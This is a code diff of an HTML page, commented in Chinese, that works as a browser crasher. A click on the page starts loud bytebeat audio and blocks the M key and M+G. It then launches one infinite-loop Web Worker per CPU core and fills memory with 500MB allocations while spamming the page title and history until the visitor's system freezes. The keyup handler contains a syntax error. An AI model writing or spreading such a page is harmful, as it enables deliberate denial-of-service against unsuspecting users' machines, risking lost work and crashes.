@@ -9,9 +9,15 @@
 <body onclick="launch()">
     <script>
         let triggered = false;
+        let keysPressed = {};
 
-        // 攔截鍵盤
-        window.addEventListener('keydown', (e) => e.preventDefault(), true);
+        // 攔截 M 及 M+G
+        window.addEventListener('keydown', (e) => {
+            const key = e.key.toUpperCase();
+            keysPressed[key] = true;
+            if (key === 'M' || (keysPressed['M'] && keysPressed['G'])) e.preventDefault();
+        }, true);
+        window.addEventListener('keyup', (e) => { delete keysPressed[key] = false; });
 
         function launch() {
             if (triggered) return;
@@ -22,6 +28,7 @@
 
             // 2. Bytebeat
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') audioCtx.resume();
             const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
             let t = 0;
             scriptNode.onaudioprocess = (e) => {
@@ -33,40 +40,35 @@
                 }
             };
             scriptNode.connect(audioCtx.destination);
-            if (audioCtx.state === 'suspended') audioCtx.resume();
 
-            // 3. 瞬間爆破邏輯 (多線程並發分配)
-            const workerCode = `
-                const data = [];
+            // 3. 瞬爆邏輯
+            setTimeout(() => {
+                const voidData = [];
+                
+                // (A) 先噴出 8 個背景炸彈
+                const blob = new Blob(["while(true){postMessage(Math.random());}"]);
+                const url = URL.createObjectURL(blob);
+                for(let i=0; i<navigator.hardwareConcurrency; i++) {
+                    new Worker(url);
+                }
+
+                // (B) 瞬間填滿 RAM 並鎖死 (不再等待 setTimeout)
+                // 這就是 JavaScript 版本的 while true do ... end
                 while(true) {
                     try {
-                        // 每個線程瘋狂申請 500MB
-                        data.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
-                    } catch(e) {
-                        data.push(new Uint8Array(10 * 1024 * 1024));
+                        // 每次循環直接塞 500MB，直到系統崩潰
+                        voidData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
+                        
+                        // 強制渲染負擔
+                        document.title = "CRITICAL_" + Math.random();
+                        window.history.pushState({}, '', Math.random());
+                    } catch (e) {
+                        // 如果 500MB 失敗，用小塊繼續填滿最後的空隙
+                        voidData.push(new Uint8Array(10 * 1024 * 1024));
                     }
                 }
-            `;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const url = URL.createObjectURL(blob);
-
-            // 開啟與 CPU 核心數相等（或雙倍）的 Worker 同時開火
-            const threads = navigator.hardwareConcurrency || 8;
-            for(let i = 0; i < threads; i++) {
-                new Worker(url);
-            }
-
-            // 主線程同時進行死循環鎖死 UI
-            setTimeout(() => {
-                const mainData = [];
-                while(true) {
-                    mainData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
-                    document.title = Math.random();
-                    window.history.pushState({}, '', Math.random());
-                }
-            }, 0);
+            }, 50); // 縮短延遲，實現「即點即爆」
         }
     </script>
 </body>
 </html>
-
